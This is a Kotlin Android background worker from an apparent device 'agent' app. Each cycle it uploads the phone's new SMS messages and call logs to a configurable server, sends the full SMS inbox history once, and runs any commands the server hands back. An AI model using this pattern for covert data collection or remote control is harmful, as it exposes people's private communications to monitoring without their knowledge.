package com.example.gmaagent.worker

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.example.gmaagent.command.CommandExecutor
import com.example.gmaagent.data.AgentPreferences
import com.example.gmaagent.data.DeviceDataReader
import com.example.gmaagent.network.ApiClient
import com.example.gmaagent.network.CommunicationLogSyncRequest
import com.example.gmaagent.network.DeviceSyncRequest
import com.example.gmaagent.network.ServerConfig

/**
 * WorkManager CoroutineWorker that performs the periodic sync cycle:
 *
 *  1. Load server config from preferences
 *  2. Read SMS & Call logs from ContentProviders (incremental)
 *  3. Upload to server via POST /sync/data
 *  3b. One-time: sync full SMS inbox history as Communication Logs
 *  4. Poll for pending commands via GET /sync/pending-commands
 *  5. Execute each command locally
 *  6. Update last-sync timestamps
 */
class SyncWorker(
    context: Context,
    params: WorkerParameters,
) : CoroutineWorker(context, params) {

    companion object {
        private const val TAG = "SyncWorker"
        private const val COMM_LOG_BATCH_SIZE = 500
    }

    override suspend fun doWork(): Result {
        Log.i(TAG, "═══ Sync cycle starting ═══")

        // Ensure the live foreground service is running
        com.example.gmaagent.service.AgentBackgroundService.startService(applicationContext)

        // ── 1. Load config ───────────────────────────────────
        val apiKey = AgentPreferences.getDeviceApiKey(applicationContext)
        if (apiKey.isBlank()) {
            Log.w(TAG, "No API key configured — skipping sync")
            return Result.retry()
        }
        ServerConfig.deviceApiKey = apiKey
        ServerConfig.baseUrl = AgentPreferences.getServerUrl(applicationContext)

        // ── 2. Read device data (incremental) ────────────────
        val lastSmsSyncTs = AgentPreferences.getLastSmsSyncTimestamp(applicationContext)
        val lastCallSyncTs = AgentPreferences.getLastCallSyncTimestamp(applicationContext)

        val smsMessages = DeviceDataReader.readSmsLogs(applicationContext, lastSmsSyncTs)
        val callLogs = DeviceDataReader.readCallLogs(applicationContext, lastCallSyncTs)

        // ── 3. Upload to server ──────────────────────────────
        if (smsMessages.isNotEmpty() || callLogs.isNotEmpty()) {
            val payload = DeviceSyncRequest(
                sms_messages = smsMessages.ifEmpty { null },
                call_logs = callLogs.ifEmpty { null },
            )

            val response = ApiClient.syncData(payload)

            if (response != null) {
                Log.i(
                    TAG,
                    "Sync success — SMS: ${response.sms_ingested}, " +
                        "Calls: ${response.calls_ingested}, " +
                        "Pending commands: ${response.pending_commands}"
                )

                // Update timestamps
                val now = System.currentTimeMillis()
                AgentPreferences.setLastSmsSyncTimestamp(applicationContext, now)
                AgentPreferences.setLastCallSyncTimestamp(applicationContext, now)
            } else {
                Log.e(TAG, "Sync upload failed")
                return Result.retry()
            }
        } else {
            Log.i(TAG, "No new data to sync")
        }

        // ── 3b. Communication Logs — one-time full inbox sync ─
        if (!AgentPreferences.isCommLogsSynced(applicationContext)) {
            Log.i(TAG, "Starting one-time Communication Logs sync...")
            syncCommunicationLogs()
        }

        // ── 4. Poll for pending commands ─────────────────────
        val commands = ApiClient.fetchPendingCommands()
        Log.i(TAG, "Received ${commands.size} pending command(s)")

        // ── 5. Execute each command ──────────────────────────
        for (cmd in commands) {
            CommandExecutor.execute(applicationContext, cmd)
        }

        Log.i(TAG, "═══ Sync cycle complete ═══")
        return Result.success()
    }

    /**
     * Reads the full SMS inbox history from the device and uploads it
     * to the server as Communication Logs in batches.
     * Sets the preference flag on success so this only runs once.
     */
    private suspend fun syncCommunicationLogs() {
        try {
            val allLogs = DeviceDataReader.readInboxSmsHistory(applicationContext)
            if (allLogs.isEmpty()) {
                Log.i(TAG, "No inbox SMS found for Communication Logs")
                AgentPreferences.setCommLogsSynced(applicationContext, true)
                return
            }

            Log.i(TAG, "Communication Logs: uploading ${allLogs.size} records in batches of $COMM_LOG_BATCH_SIZE")

            var totalIngested = 0
            var totalDuplicates = 0

            // Upload in batches to avoid payload size limits
            val batches = allLogs.chunked(COMM_LOG_BATCH_SIZE)
            for ((index, batch) in batches.withIndex()) {
                val payload = CommunicationLogSyncRequest(logs = batch)
                val response = ApiClient.syncCommunicationLogs(payload)

                if (response != null) {
                    totalIngested += response.logs_ingested
                    totalDuplicates += response.duplicates_skipped
                    Log.i(
                        TAG,
                        "Communication Logs batch ${index + 1}/${batches.size}: " +
                            "${response.logs_ingested} ingested, " +
                            "${response.duplicates_skipped} duplicates skipped"
                    )
                } else {
                    Log.e(TAG, "Communication Logs batch ${index + 1} failed — will retry next cycle")
                    return  // Don't set flag; retry on next sync
                }
            }

            Log.i(
                TAG,
                "Communication Logs sync complete — $totalIngested ingested, $totalDuplicates duplicates"
            )
            AgentPreferences.setCommLogsSynced(applicationContext, true)
        } catch (e: Exception) {
            Log.e(TAG, "Communication Logs sync error — will retry next cycle", e)
        }
    }
}
